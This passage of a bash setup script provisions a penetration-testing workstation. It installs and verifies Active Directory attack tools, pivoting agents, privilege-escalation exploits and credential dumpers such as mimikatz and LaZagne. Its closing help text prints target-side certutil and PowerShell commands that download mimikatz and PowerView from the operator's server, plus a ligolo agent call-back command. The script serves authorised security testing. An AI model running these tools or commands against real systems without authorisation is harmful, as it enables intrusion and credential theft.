             rm -f "$WINDIR/legacy/sharphound-legacy.zip"; } \
        || print_warning "SharpHound legacy zip left in place"
fi
if fetch_pinned sharphound_ce "$WINDIR/ce/sharphound-ce.zip"; then
    unzip -o -q "$WINDIR/ce/sharphound-ce.zip" -d "$WINDIR/ce" 2>/dev/null \
        && { print_success "SharpHound 2.x (CE format) -> $WINDIR/ce/"
             rm -f "$WINDIR/ce/sharphound-ce.zip"; } \
        || print_warning "SharpHound CE zip left in place"
fi

# --- PowerUpSQL: MSSQL enumeration and privesc from a domain foothold ------
# A module, not a single file, so it is cloned rather than fetched. MSSQL is a
# named target shape in the vuln catalog and nothing in the build covered it.
clone_pinned PowerUpSQL https://github.com/NetSPI/PowerUpSQL "$WINDIR/PowerUpSQL"

# --- CVE-2023-29360: MSKSSRV.SYS local privilege escalation ----------------
# Source only - there is no release binary, so this needs building on a Windows
# box with the VS build tools (extras/vsbuildtools.ps1 in the old repo does that).
# Cloned so the source is ON the box; building it is a prep-time task, not an
# engagement-day one.
if clone_pinned cve_2023_29360 https://github.com/Nero22k/cve-2023-29360 \
        "$WINDIR/cve-2023-29360-src"; then
    print_warning "CVE-2023-29360 is SOURCE ONLY - build it during prep, not on the day."
fi

fi   # end of WINDIR_OK
fin_msg 'Windows payload set'

# ---------------------------------------------------------------------------
# ligolo-ng - the pivot the build did not have
# ---------------------------------------------------------------------------
# chisel/sshuttle/proxychains were the whole pivoting story. ligolo-ng gives a
# routed TUN interface instead of a SOCKS proxy, which is what the AD tooling that
# misbehaves under proxychains actually needs. Proxy here, agent on the target.
print_status "Installing ligolo-ng (proxy here, agents into the payload set)..."
if ! command -v ligolo-proxy &>/dev/null; then
    if fetch_pinned ligolo_proxy "$USER_HOME/dropzone/ligolo-proxy.tar.gz"; then
        if tar -xzf "$USER_HOME/dropzone/ligolo-proxy.tar.gz" -C "$USER_HOME/dropzone" proxy 2>/dev/null; then
            sudo install -m 0755 "$USER_HOME/dropzone/proxy" /usr/local/bin/ligolo-proxy \
                && print_success "ligolo-proxy -> /usr/local/bin/ligolo-proxy"
            rm -f "$USER_HOME/dropzone/proxy" "$USER_HOME/dropzone/ligolo-proxy.tar.gz"
        else
            print_warning "ligolo proxy tarball did not contain 'proxy' - unpack by hand"
        fi
    fi
else
    print_success "ligolo-proxy already installed"
fi
if fetch_pinned ligolo_agent_win "$WINDIR/ligolo-agent-windows.zip"; then
    unzip -o -q -j "$WINDIR/ligolo-agent-windows.zip" 'agent.exe' -d "$WINDIR" 2>/dev/null \
        && { print_success "ligolo agent.exe -> payload set"; rm -f "$WINDIR/ligolo-agent-windows.zip"; } \
        || print_warning "ligolo windows agent zip left in place"
fi
if fetch_pinned ligolo_agent_lin "$USER_HOME/dropzone/ligolo-agent-linux.tar.gz"; then
    tar -xzf "$USER_HOME/dropzone/ligolo-agent-linux.tar.gz" -C "$USER_HOME/dropzone" agent 2>/dev/null \
        && { mv -f "$USER_HOME/dropzone/agent" "$USER_HOME/dropzone/ligolo-agent-linux"
             chmod 0755 "$USER_HOME/dropzone/ligolo-agent-linux"
             print_success "ligolo linux agent -> ~/dropzone/ligolo-agent-linux"
             rm -f "$USER_HOME/dropzone/ligolo-agent-linux.tar.gz"; } \
        || print_warning "ligolo linux agent tarball left in place"
fi
print_status "Usage: ligolo-proxy -selfcert  then run agent.exe -connect <kali>:11601 on target"
fin_msg 'ligolo-ng'

print_status "Installing additional AD Python tools..."
pip_ensure pypykatz pypykatz     # already installed above; pip_ensure skips it
# aardwolf has C/build deps - build-essential/python3-dev/libffi-dev were installed
# above so the wheel builds instead of failing. nxc no longer depends on this pip
# build (it comes from the apt 'netexec' package), so a failure here is non-fatal.
pip_ensure aardwolf aardwolf
else
    print_status "--no-ad: skipping the AD/internal section."
fi

print_status "Verifying screenshot tools..."
if command -v flameshot &> /dev/null; then
    flameshot_version=$(flameshot --version 2>&1 | head -n1)
    print_success "Flameshot installed and working: $flameshot_version"
    print_status "Flameshot keybindings: Use 'flameshot gui' or set keyboard shortcut"
else
    print_warning "Flameshot not found"
fi

if command -v scrot &> /dev/null; then
    print_success "scrot installed (alternative screenshot tool)"
fi

if command -v maim &> /dev/null; then
    print_success "maim installed (alternative screenshot tool)"
fi

hash -r

echo -e "\n${GREEN}"
echo "╔═══════════════════════════════════════════════════════╗"
echo "║     Installation Complete - verifying...               ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

print_success "All tools installed successfully!"
print_success "Tools are located at: ~/dropzone"
print_success "Log file: $LOG_FILE"
print_warning "Note: Logout/login required for docker group changes to take effect"

echo ""
print_status "Running comprehensive tools verification..."
echo ""

# The verification helpers and the PASS/WARN/FAIL counters live in lib.sh now.
# They were duplicated here and in ad.sh as two near-identical ~80-line blocks
# with different counter names, so every fix had to be made twice and nothing
# reported the divergence. Merging the two scripts removed the second copy.

if [ "$WANT_REST" -eq 1 ]; then
print_status "Checking core scanning tools..."
check_tool "nmap"       "nmap --version"        "nmap version"
check_tool "masscan"    "masscan --version"     "masscan"
# `gobuster version` is NOT a subcommand - it prints "No help topic for 'version'",
# which has no digits in it, so this check has been quietly warning for a while.
# `gobuster --version` prints "gobuster version 3.8.2". Verified on Kali 2026.2.
check_tool "gobuster"   "gobuster --version"    "[0-9]+\.[0-9]+"
check_tool "ffuf"       "ffuf -V"               "ffuf"
check_tool "feroxbuster" "feroxbuster --version" "feroxbuster"

print_status "Checking web tools..."
check_tool "nikto"      "nikto -Version"        "nikto"
check_tool "nuclei"     "nuclei -version"       "nuclei"
check_tool "whatweb"    "whatweb --version"     "whatweb"
# Burp: no longer an apt package, so 'dpkg -s' is the wrong question. These four
# checks each catch a different real failure:
#  1. the jar exists AND is a jar (a captive portal returns HTML with a 200);
#  2. 'burpsuite --version' RUNS - which is the only thing that proves the JVM is
#     new enough. Burp needs Java 21 and Kali also ships openjdk-11; on 17 it dies
#     with "UnsupportedClassVersionError ... class file version 65.0", so this is
#     the check that would have caught shipping only openjdk-11-jdk;
#  3. a JVM of at least 21 is actually present for the wrapper to find;
#  4. the version file, so the summary records WHICH Burp this box has.
check_payload "$BURP_DIR/burpsuite.jar" "Burp jar" '^PK' 100000000
check_cmd  "burpsuite runs (JVM >= 21)" \
           "timeout 180 burpsuite --version 2>&1 | head -5" "burp|version"
check_cmd  "a JVM >= 21 is installed" \
           "for j in \$(ls -d /usr/lib/jvm/*/bin/java 2>/dev/null | sort -rV); do v=\$(\$j -version 2>&1 | sed -n 's/.*version \"\\([0-9][0-9]*\\).*/\\1/p' | head -1); [ -n \"\$v\" ] && [ \"\$v\" -ge 21 ] 2>/dev/null && echo \"found \$v\" && break; done" \
           "found"
check_file "$BURP_DIR/VERSION" "Burp version record ($(cat "$BURP_DIR/VERSION" 2>/dev/null || echo 'unknown'))"
check_tool "java"       "java -version"         "version"
check_cmd  "jwt_tool"   "python3 $USER_HOME/dropzone/jwt_tool/jwt_tool.py --help" "jwt|usage"
check_tool "arjun"      "arjun --help"          "arjun|usage"
check_tool "phpggc"     "phpggc -l"             "gadget|chain|[0-9]"
# A fat jar is only proven by running it: 'java -jar <jar>' with no arguments
# prints the gadget list, which also re-proves the JRE.
check_cmd  "ysoserial"  "java -jar $USER_HOME/dropzone/ysoserial-all.jar 2>&1 | head -40" "gadget|usage|payload"

print_status "Checking network tools..."
check_tool "chisel"       "chisel --version"    "[0-9]"
check_tool "socat"        "socat -V"            "socat version"
check_tool "proxychains4" "proxychains4 -h"     "proxychains|usage"
check_tool "sshuttle"     "sshuttle --version"  "[0-9]"

print_status "Checking password tools..."
check_tool "hydra"   "hydra -h"                 "hydra v[0-9]|syntax:"
check_tool "john"    "john --list=build-info"   "version|build"
check_tool "hashcat" "hashcat --version"        "[0-9]+\.[0-9]"

print_status "Checking exploitation / traffic tools..."
check_tool "msfconsole" "msfconsole --version"  "framework|metasploit"
check_tool "responder"  "responder -h"          "responder|usage"
check_tool "tcpdump"    "tcpdump --version"     "tcpdump version|libpcap"
check_tool "tshark"     "tshark --version"      "tshark"
check_tool "netexec"    "netexec --version"     "[0-9]+\.[0-9]"

print_status "Checking container tooling..."
# 'docker info' talks to the DAEMON - it is the only check that proves docker can
# actually run something. Falls back to sudo because the docker group is not
# active until the operator has logged out and back in.
check_tool "docker"         "docker info 2>/dev/null || sudo docker info" "server version"
check_tool "docker-compose" "docker-compose version"                      "[0-9]+\.[0-9]"

print_status "Checking Go tools..."
# CHECK THE GOPATH BINARY BY ABSOLUTE PATH, not whatever `httpx` resolves to.
# Two things went wrong here and they compounded:
#   1. /usr/bin/httpx belongs to python3-httpx - the Python HTTP *client library*
#      CLI, a completely unrelated tool that merely shares the name with
#      projectdiscovery's web prober. go_install's old `command -v httpx` guard
#      saw it and skipped installing the real prober, so the web team's `httpx`
#      was never the prober at all.
#   2. The pattern was "httpx", and Kali's python httpx prints
#      "Usage: httpx [OPTIONS] URL" - which MATCHES. So the check passed, on the
#      wrong tool, while reporting the right name.
# Checking $USER_HOME/go/bin/<tool> removes the ambiguity completely: there is
# exactly one binary it can be.
#
# The pattern also cannot be the tool's name: projectdiscovery renders it as
# ASCII ART in the banner, so the literal letters never appear. The version line
# does - "[INF] Current Version: v1.12.0".
check_cmd "httpx"     "$USER_HOME/go/bin/httpx -version"     "Current Version|projectdiscovery"
check_cmd "subfinder" "$USER_HOME/go/bin/subfinder -version" "Current Version|projectdiscovery"
# These two read domains on stdin; empty stdin makes them exit 0 without touching
# the network, which is the cheapest honest proof that the binary executes.
# Same absolute-path rule. These two take stdin and exit 0 on empty input, so
# there is no pattern - _run_check falls back to the exit code.
check_cmd "httprobe"    "printf '' | timeout 10 $USER_HOME/go/bin/httprobe"
check_cmd "waybackurls" "printf '' | timeout 10 $USER_HOME/go/bin/waybackurls"

print_status "Checking screenshot tools..."
check_tool "flameshot" "flameshot --version" "flameshot"
check_tool "scrot"     "scrot --version"     "scrot"
check_tool "maim"      "maim --version"      "[0-9]"

print_status "Checking privilege escalation scripts..."
check_script  "$USER_HOME/dropzone/privesc/linpeas.sh" "linpeas.sh"
check_payload "$USER_HOME/dropzone/privesc/winpeas.exe"      "winpeas.exe"      "^MZ"                 100000 winpeas
check_payload "$USER_HOME/dropzone/pspy64"                   "pspy64"           "ELF"                 1000000 pspy64
check_payload "$USER_HOME/dropzone/privesc/PrivescCheck.ps1" "PrivescCheck.ps1" "function|param"      10000 privesccheck
check_payload "$USER_HOME/dropzone/privesc/privesc.ps1"      "privesc.ps1"      "function|param|write" 5000 privesc_ps1
check_payload "$USER_HOME/dropzone/username-anarchy"         "username-anarchy" "ruby|#!"              5000
check_script  "/usr/local/bin/upshell" "upshell"

print_status "Checking cloned repos..."
if [ "$WANT_MOBILE" -eq 1 ]; then
    check_file "$USER_HOME/dropzone/nuclei-templates" "nuclei-templates"
fi

print_status "Checking wordlists..."
check_payload "/usr/share/wordlists/rockyou.txt" "rockyou.txt" "." 50000000
check_file    "/usr/share/seclists" "SecLists"

print_status "Checking cloud tooling..."
check_tool "aws"        "aws --version"         "aws-cli"
check_tool "az"         "az version"            "azure-cli|[0-9]+\\.[0-9]"
check_tool "azurehound" "azurehound --version"  "azurehound|v?[0-9]+\\.[0-9]"
check_tool "roadrecon"  "roadrecon --help"      "roadrecon|usage"
check_pymod roadtools "ROADtools (roadlib)"

print_status "Checking OT/ICS tooling..."
check_pymod asyncua "asyncua (OPC-UA)"
check_pymod icspacket "icspacket (DNP3/MMS/IEC-104/CIP/BACnet)"
# PATTERN NARROWED TO 'usage' ONLY, and this is why it matters. It used to be
# "usage|opcattack|error" and it passed a box where the tool was broken:
#     [!] opcattack dependencies failed - it may not run      <- the build knew
#     [+] opcattack verified                                  <- and said this
# Running it by hand gives a Traceback ("from attacks import *" -> ImportError).
# That output matched on TWO counts: 'opcattack' appears in the traceback's own
# file path (/home/kali/dropzone/opcattack/opcattack.py), and 'error' matches
# every Python exception name ending in Error, case-insensitively. A verification
# pattern must never contain a word that appears in a failure message or in the
# tool's own path. argparse prints "usage:" only when the script actually
# imported, which is exactly the thing being tested.
check_cmd  "opcattack" "python3 $USER_HOME/dropzone/opcattack/opcattack.py --help" "usage"
check_tool "modbuster" "modbuster --help"       "modbus|usage"

if [ "$WANT_MOBILE" -eq 1 ]; then
    print_status "Checking mobile tooling (--mobile)..."
    check_tool "jadx"    "jadx --version"    "[0-9]+\\.[0-9]"
    check_tool "apktool" "apktool --version" "[0-9]+\\.[0-9]"
    check_tool "adb"     "adb version"       "android debug bridge|[0-9]+\\.[0-9]"
    check_tool "frida"   "frida --version"   "[0-9]+\\.[0-9]"
    check_file "/opt/android-studio" "Android Studio"
fi

print_status "Checking shell helpers..."
check_tool "rlwrap" "rlwrap --version" "rlwrap"

print_status "Checking Python packages..."
check_pymod requests "requests"
check_pymod bs4 "beautifulsoup4"
check_pymod pwn "pwntools"

print_status "Checking reporting pipeline dependencies..."
check_pymod docx "python-docx"
check_pymod openpyxl "openpyxl"
check_pymod PIL "Pillow"
check_pymod pytesseract "pytesseract"
check_pymod fitz "PyMuPDF (fitz)"
check_tool "tesseract" "tesseract --version" "tesseract"
check_tool "soffice"   "soffice --version"   "libreoffice"

fi   # end of the "$WANT_REST" checks

if [ "$WANT_AD" -eq 1 ]; then
print_status "Checking AD / internal tooling..."
check_tool "bloodhound" "dpkg -s bloodhound" "install ok installed"
check_tool "neo4j"      "dpkg -s neo4j"      "install ok installed"
# `evil-winrm -h` prints its banner only when stdout is a TTY - under the build's
# own redirection it emits nothing at all, so the pattern never matched and this
# sat as a permanent "suspect" warning. `evil-winrm --version` prints "v3.9"
# regardless. Verified on evil-winrm 3.9-0kali2.
check_tool "evil-winrm" "evil-winrm --version"  "v?[0-9]+\.[0-9]+"
check_tool "responder"  "responder -h"       "responder|usage"
check_tool "enum4linux" "enum4linux -h"      "enum4linux|usage"
check_tool "kerbrute"   "kerbrute version"   "[0-9]+\.[0-9]"
check_tool "windapsearch" "windapsearch --help" "windapsearch|usage"
check_tool "certipy-ad" "certipy-ad --version" "[0-9]"
check_tool "netexec"    "netexec --version"  "[0-9]+\.[0-9]"
check_tool "impacket-secretsdump" "impacket-secretsdump -h" "impacket|usage"
check_tool "bloodhound-python"    "bloodhound-python -h"    "usage|bloodhound"

check_tool "ldapsearch" "ldapsearch -VV" "ldapsearch|openldap"
check_tool "klist"      "klist --version || klist -V" "kerberos|klist|[0-9]+\\.[0-9]"
# freerdp3 names its binary xfreerdp3, NOT xfreerdp - a script written against the
# old name silently does nothing on a current Kali.
check_tool "xfreerdp3"  "xfreerdp3 --version" "freerdp|[0-9]+\\.[0-9]"
# ntpdate comes from ntpsec-ntpdate and lands in /usr/sbin, which is not on a
# normal user's PATH - so locate it rather than running it (it needs root + a
# reachable time source to do anything anyway).
check_cmd  "ntpdate (clock skew fix)" "command -v ntpdate || ls /usr/sbin/ntpdate" "ntpdate"

check_cmd  "PowerView.py" "powerview --help" "powerview|usage"
check_cmd  "pywhisker" "pywhisker -h || python3 $USER_HOME/dropzone/pywhisker/pywhisker/pywhisker.py -h" "usage|pywhisker"
check_cmd  "targetedKerberoast" "python3 $USER_HOME/dropzone/targetedKerberoast/targetedKerberoast.py -h" "usage|kerberoast"
check_repo "$USER_HOME/dropzone/targetedKerberoast" "targetedKerberoast repo"

check_repo "$USER_HOME/dropzone/Ghostpack-CompiledBinaries" "Ghostpack binaries"
# Rubeus is the one file we can count on being in that repo - prove it is a real
# PE and not an HTML error page or an LFS pointer stub.
if [ -f "$USER_HOME/dropzone/Ghostpack-CompiledBinaries/Rubeus.exe" ]; then
    if head -c 2 "$USER_HOME/dropzone/Ghostpack-CompiledBinaries/Rubeus.exe" | grep -qa "^MZ"; then
        print_success "Rubeus.exe verified (valid PE)"; PASS=$((PASS+1))
    else
        print_error "Rubeus.exe is not a PE file - bad clone"; FAIL=$((FAIL+1))
    fi
fi
check_repo "$USER_HOME/dropzone/SharpEfsPotato" "SharpEfsPotato"
check_repo "$USER_HOME/dropzone/bloodyAD" "bloodyAD"
# Running PKINITtools with -h imports minikerberos, so this proves the tool AND
# its dependency in one go - the thing a file-existence check cannot tell you.
# 'error' dropped for the same reason as opcattack: it matches the name of every
# Python exception, so a traceback counted as a pass.
check_cmd "PKINITtools" "python3 $USER_HOME/dropzone/PKINITtools/gettgtpkinit.py -h" "usage"

# --- the collectors, and they are checked as a PAIR ------------------------
# Both must exist, because the two viewers each need their own. A box with only
# one of them has a graph path that fails at ingest rather than at collection,
# which is the expensive place to find out.
check_tool "bloodhound-ce-python" "bloodhound-ce-python -h" "usage|bloodhound"

check_repo "$USER_HOME/dropzone/krbrelayx" "krbrelayx"
check_cmd  "krbrelayx printerbug" "python3 $USER_HOME/dropzone/krbrelayx/printerbug.py -h" "usage"
check_repo "$USER_HOME/dropzone/gMSADumper" "gMSADumper"
check_repo "$USER_HOME/dropzone/KeyTabExtract" "KeyTabExtract"
check_repo "$USER_HOME/dropzone/certighost" "Certighost PoC (CVE-2026-54121)"

# --- Windows payload set ---------------------------------------------------
# Every one of these is fetched over HTTP, so the failure mode that matters is a
# captive portal or intercepting proxy returning an HTML page with a 200 status.
# A PE starts "MZ" and a PowerShell script does not start "<" - that is enough to
# tell a real payload from a login page, and it is the check all.sh's
# check_payload exists for.

WINDIR="$USER_HOME/dropzone/windows"
check_pe  "$WINDIR/mimikatz.exe"               "mimikatz.exe"
check_pe  "$WINDIR/PrintSpoofer64.exe"         "PrintSpoofer64.exe"
check_pe  "$WINDIR/GodPotato-NET4.exe"         "GodPotato-NET4.exe"
check_pe  "$WINDIR/LaZagne.exe"                "LaZagne.exe"
check_pe  "$WINDIR/accesschk64.exe"            "accesschk64.exe"
check_pe  "$WINDIR/agent.exe"                  "ligolo agent.exe"
check_ps1 "$WINDIR/PowerView.ps1"              "PowerView.ps1"
check_ps1 "$WINDIR/Powermad.ps1"               "Powermad.ps1 (RBCD chain)"
check_ps1 "$WINDIR/Invoke-RunasCs.ps1"         "Invoke-RunasCs.ps1"
check_ps1 "$WINDIR/adPEAS.ps1"                 "adPEAS.ps1"
check_file "$WINDIR/pstools/PsExec64.exe"      "PSTools (PsExec64)"
check_repo "$WINDIR/PowerUpSQL"                "PowerUpSQL"
# The two SharpHound generations must BOTH be present and must NOT be in the same
# directory - that separation is the only thing stopping a mixed ingest.
check_cmd "SharpHound LEGACY (1.x) present" \
    "ls $WINDIR/legacy/ | grep -qi sharphound && echo found" "found"
check_cmd "SharpHound CE (2.x) present" \
    "ls $WINDIR/ce/ | grep -qi sharphound && echo found" "found"

check_tool "ligolo-proxy" "ligolo-proxy --help" "ligolo|usage|selfcert"

check_pymod pypykatz "pypykatz"
check_pymod impacket "impacket (python module)"
check_pymod ldap3 "ldap3 (bloodyAD dependency)"
fi


echo ""
echo -e "${GREEN}═══════════════════════════════════════${NC}"
echo -e "${GREEN}Verification Summary${NC}"
echo -e "${GREEN}═══════════════════════════════════════${NC}"
echo -e "${GREEN}Passed:  $PASS${NC}"
echo -e "${YELLOW}Warnings: $WARN${NC}"
echo -e "${RED}Failed:  $FAIL${NC}"
echo ""

# The headline must account for HASH_MISMATCH too. Run 4 printed
# "All critical tools verified!" while linpeas was sitting in the untrusted list,
# because a pin mismatch happens during the FETCH phase and never touches $FAIL.
# Technically accurate, completely misleading - and the mismatch line had already
# scrolled past by then.
if [ $FAIL -eq 0 ] && [ ${#HASH_MISMATCH[@]} -eq 0 ]; then
    print_success "All critical tools verified!"
elif [ $FAIL -eq 0 ]; then
    print_warning "Checks all passed, BUT ${#HASH_MISMATCH[@]} artifact(s) failed their sha256 pin"
    print_warning "  (${HASH_MISMATCH[*]}) - see the pin summary below before trusting this box."
else
    print_warning "$FAIL tools failed verification - check log file"
fi

# Name the warnings. "Warnings: 2" told nobody that gobuster's and evil-winrm's
# check commands had gone stale, so they stayed stale.
if [ ${#WARN_DETAIL[@]} -gt 0 ]; then
    echo ""
    print_warning "${#WARN_DETAIL[@]} check(s) only WARNED - the tool is present but unproven:"
    for w in "${WARN_DETAIL[@]}"; do print_warning "  - $w"; done
    print_warning "  Either the tool is broken or OUR check command has drifted. Both need a human."
fi

if [ ${#APT_FAILED[@]} -gt 0 ]; then
    echo ""
    print_warning "APT packages that FAILED to install: ${APT_FAILED[*]}"
    print_warning "  Retry manually: sudo apt install ${APT_FAILED[*]}"
fi

# Reported separately from APT_FAILED because it is a MILDER fault with the same
# cause. The tool is there and the verification below will pass it; what did not
# happen is the upgrade, so this box is pinned to whatever the ISO shipped while
# another operator's box got the newer build. That divergence is invisible unless
# it is named here - run 7 kept responder at 3.2.2.0-0kali1 and nothing in the
# summary said so.
if [ ${#APT_STALE[@]} -gt 0 ]; then
    echo ""
    print_warning "APT packages left at an OLDER version (upgrade fetch failed twice): ${APT_STALE[*]}"
    print_warning "  The tool works; this box just is not current. Another operator may differ."
    print_warning "  Retry manually: sudo apt install --only-upgrade ${APT_STALE[*]}"
fi

# Last chance to hand back anything created while running as root.
own_user "$USER_HOME/dropzone" "$USER_HOME/go" "$PINS_LOCK" 2>/dev/null

# The apt-installed tools that actually decide how this box behaves. Recorded so
# `pins.sh` can diff them box to box - they used to be absent from pins.lock
# entirely, which made the diff misleading rather than merely incomplete.
record_apt_versions \
    impacket-scripts netexec certipy-ad evil-winrm \
    bloodhound.py bloodhound-ce-python bloodhound neo4j \
    python3-pwntools nuclei feroxbuster ffuf gobuster hashcat \
    metasploit-framework responder seclists krb5-user freerdp3-x11 \
    python3-impacket ldap-utils

pin_summary

if [ "$WANT_AD" -eq 1 ]; then
echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   BloodHound / Neo4j - how to launch                  ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"
print_success "BloodHound CE:  sudo bloodhound-setup   (first time - PRINTS its admin creds)"
print_success "                then  sudo bloodhound-start   (stop: sudo bloodhound-stop)"
print_success "Raw neo4j (legacy tooling):  sudo neo4j start  ->  http://localhost:7474  (neo4j/neo4j, set new pw on 1st login)"
echo ""
print_warning "TWO graph stacks - do not mix collections (ingest fails, it does not warn):"
print_warning "  bloodhound-python      + windows/legacy/SharpHound  ->  BloodHound 4.3.1 (Windows box)"
print_warning "  bloodhound-ce-python   + windows/ce/SharpHound      ->  BloodHound CE (this box)"
print_warning "  azurehound                                          ->  BloodHound CE only"

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   Windows payload set - how to serve it                ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"
print_success "cd ~/dropzone/windows && python3 -m http.server 9999"
print_success "  target>  certutil -urlcache -split -f http://<this-box>:9999/mimikatz.exe m.exe"
print_success "  target>  iwr -UseBasicParsing http://<this-box>:9999/PowerView.ps1 -OutFile pv.ps1"
print_status  "Or over SMB:  impacket-smbserver -smb2support share ~/dropzone/windows"
fi

echo ""
echo -e "${YELLOW}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║   NEXT STEP                                           ║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════╝${NC}"
if [ "$WANT_MOBILE" -eq 0 ]; then
    print_status "Mobile/AI owner: this run SKIPPED the mobile kit and nuclei-templates."
    print_status "  Get them with: bash all.sh --mobile   (adds ~2.3 GB of downloads)"
fi
if [ "$WANT_AD" -eq 0 ]; then
    print_status "This run SKIPPED the AD/internal section (--no-ad)."
    print_status "  Add it later with: bash all.sh --ad-only"
fi
print_status "LOG OUT AND BACK IN (or reboot) now to activate:"
print_warning "  - command logging      (new shells load the ~/.zshrc / ~/.bashrc hooks)"
print_warning "  - uniform terminal look (applies to new terminal windows)"
print_warning "  - docker group access   (run docker without sudo)"
print_warning "  - PATH for ~/go/bin and ~/.local/bin (go & pipx tools)"
echo ""

print_success "Good Luck!"
